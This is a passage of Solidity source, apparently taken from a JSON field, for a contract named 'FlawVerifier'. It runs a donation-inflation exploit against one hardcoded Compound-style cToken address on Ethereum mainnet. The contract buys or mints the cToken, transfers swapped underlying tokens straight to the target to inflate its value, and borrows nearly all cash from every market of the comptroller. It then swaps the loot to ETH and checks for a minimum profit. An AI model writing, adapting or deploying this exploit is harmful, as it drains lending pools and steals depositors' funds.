ce IUniswapV2Router {\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ninterface IUniswapV3Router {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 deadline;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);\n}\n\ninterface ICToken {\n    function underlying() external view returns (address);\n    function comptroller() external view returns (address);\n    function mint(uint256 amount) external returns (uint256);\n    function borrow(uint256 amount) external returns (uint256);\n    function getCash() external view returns (uint256);\n    function balanceOf(address owner) external view returns (uint256);\n}\n\ninterface IComptroller {\n    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);\n    function getAllMarkets() external view returns (address[] memory);\n    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\ncontract FlawVerifier {\n    address constant TARGET = 0xE3334e66634acF17B2b97ab560ec92D6861b25fa;\n    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address constant ROUTER_UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address constant ROUTER_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;\n    address constant ROUTER_V3 = 0xE592427A0AEce92De3Edee1F18E0157C05861564;\n    address constant ROUTER_V3_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n\n    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;\n    address constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;\n    address constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;\n    address constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;\n    address constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;\n    address constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;\n    address constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;\n    address constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;\n    address constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;\n\n    constructor() {}\n\n    function executeOnOpportunity() external {\n        uint256 initialBalance = address(this).balance;\n        _executeDonationInflationBorrow();\n        _unwindMajorTokens();\n        _unwindComptrollerMarkets();\n        uint256 wethBal = IERC20(WETH).balanceOf(address(this));\n        if (wethBal > 0) IWETH(WETH).withdraw(wethBal);\n        require(address(this).balance >= initialBalance + 0.1 ether, \"Insufficient profit\");\n    }\n\n    function _executeDonationInflationBorrow() internal {\n        address underlying = _safeUnderlying(TARGET);\n        if (underlying == address(0)) return;\n\n        address comptroller = _safeComptroller(TARGET);\n        if (comptroller == address(0)) return;\n\n        if (ICToken(TARGET).balanceOf(address(this)) == 0) {\n            _buyTargetCToken();\n        }\n        if (ICToken(TARGET).balanceOf(address(this)) == 0) {\n            _tryMintFallback(underlying);\n        }\n        if (ICToken(TARGET).balanceOf(address(this)) == 0) return;\n\n        address[] memory entered = new address[](1);\n        entered[0] = TARGET;\n        try IComptroller(comptroller).enterMarkets(entered) {} catch {\n            return;\n        }\n        if (!_hasBorrowLiquidity(comptroller)) return;\n\n        uint256 seedDonateBudget = address(this).balance / 5000;\n        if (seedDonateBudget > 25 ether) seedDonateBudget = 25 ether;\n        if (seedDonateBudget > 0) {\n            _swapEthForTokenAny(underlying, seedDonateBudget);\n            uint256 seedDonate = IERC20(underlying).balanceOf(address(this));\n            if (seedDonate > 0) {\n                try IERC20(underlying).transfer(TARGET, seedDonate) returns (bool) {} catch {}\n            }\n        }\n        if (!_hasBorrowLiquidity(comptroller)) return;\n\n        uint256 donateBudget = address(this).balance / 3;\n        if (donateBudget > 300_000 ether) donateBudget = 300_000 ether;\n        if (donateBudget == 0) return;\n        _swapEthForTokenAny(underlying, donateBudget);\n\n        uint256 donate = IERC20(underlying).balanceOf(address(this));\n        if (donate > 0) {\n            try IERC20(underlying).transfer(TARGET, donate) returns (bool) {} catch {}\n        }\n        if (!_hasBorrowLiquidity(comptroller)) return;\n\n        _borrowAcrossMarkets(comptroller);\n        _borrowOneMarket(TARGET);\n    }\n\n    function _buyTargetCToken() internal {\n        uint256 buyBudget = address(this).balance / 1000;\n        if (buyBudget > 200 ether) buyBudget = 200 ether;\n        if (buyBudget == 0) return;\n        _swapEthForTokenAny(TARGET, buyBudget);\n    }\n\n    function _tryMintFallback(address underlying) internal {\n        uint256 mintBudget = address(this).balance / 5000;\n        if (mintBudget > 20 ether) mintBudget = 20 ether;\n        if (mintBudget == 0) return;\n\n        _swapEthForTokenAny(underlying, mintBudget);\n        uint256 mintAmount = IERC20(underlying).balanceOf(address(this));\n        if (mintAmount == 0) return;\n        _approveMax(underlying, TARGET);\n        try ICToken(TARGET).mint(mintAmount) returns (uint256) {} catch {}\n    }\n\n    function _hasBorrowLiquidity(address comptroller) internal view returns (bool) {\n        try IComptroller(comptroller).getAccountLiquidity(address(this)) returns (uint256 err, uint256 liq, uint256 shortfall) {\n            return err == 0 && shortfall == 0 && liq > 0;\n        } catch {\n            return false;\n        }\n    }\n\n    function _borrowAcrossMarkets(address comptroller) internal {\n        address[] memory markets;\n        try IComptroller(comptroller).getAllMarkets() returns (address[] memory m) {\n            markets = m;\n        } catch {\n            return;\n        }\n\n        for (uint256 i = 0; i < markets.length; i++) {\n            if (markets[i] == TARGET) continue;\n            _borrowOneMarket(markets[i]);\n        }\n    }\n\n    function _borrowOneMarket(address market) internal {\n        ICToken c = ICToken(market);\n        uint256 cash;\n        try c.getCash() returns (uint256 available) {\n            cash = available;\n        } catch {\n            return;\n        }\n        if (cash == 0) return;\n\n        uint256[12] memory bps = [uint256(10000), 9800, 9500, 9000, 8000, 7000, 6000, 5000, 3000, 1000, 500, 100];\n        for (uint256 i = 0; i < bps.length; i++) {\n            uint256 nowCash;\n            try c.getCash() returns (uint256 available) {\n                nowCash = available;\n            } catch {\n                return;\n            }\n            if (nowCash == 0) return;\n            uint256 amount = (nowCash * bps[i]) / 10000;\n            if (amount == 0) continue;\n            try c.borrow(amount) returns (uint256) {} catch {}\n        }\n    }\n\n    function _unwindComptrollerMarkets() internal {\n        address comptroller = _safeComptroller(TARGET);\n        if (comptroller == address(0)) return;\n\n        address[] memory markets;\n        try IComptroller(comptroller).getAllMarkets() returns (address[] memory m) {\n            markets = m;\n        } catch {\n            return;\n        }\n\n        for (uint256 i = 0; i < markets.length; i++) {\n            address token = _safeUnderlying(markets[i]);\n            if (token == address(0)) continue;\n            _swapTokenToEthAny(token);\n        }\n    }\n\n    function _unwindMajorTokens() internal {\n        _swapTokenToEthAny(USDC);\n        _swapTokenToEthAny(USDT);\n        _swapTokenToEthAny(DAI);\n        _swapTokenToEthAny(WBTC);\n        _swapTokenToEthAny(UNI);\n        _swapTokenToEthAny(LINK);\n        _swapTokenToEthAny(AAVE);\n        _swapTokenToEthAny(MKR);\n        _swapTokenToEthAny(COMP);\n        _swapTokenToEthAny(CRV);\n        _swapTokenToEthAny(SUSHI);\n        _swapTokenToEthAny(BAL);\n    }\n\n    function _swapEthForTokenAny(address tokenOut, uint256 ethAmount) internal {\n        if (tokenOut == address(0) || tokenOut == WETH || ethAmount == 0 || ethAmount > address(this).balance) return;\n\n        uint256 balBefore = IERC20(tokenOut).balanceOf(address(this));\n        address[] memory path = new address[](2);\n        path[0] = WETH;\n        path[1] = tokenOut;\n        try IUniswapV2Router(ROUTER_UNI).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(0, path, address(this), block.timestamp) {\n            if (IERC20(tokenOut).balanceOf(address(this)) > balBefore) return;\n        } catch {}\n        try IUniswapV2Router(ROUTER_SUSHI).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(0, path, address(this), block.timestamp) {\n            if (IERC20(tokenOut).balanceOf(address(this)) > balBefore) return;\n        } catch {}\n"}}
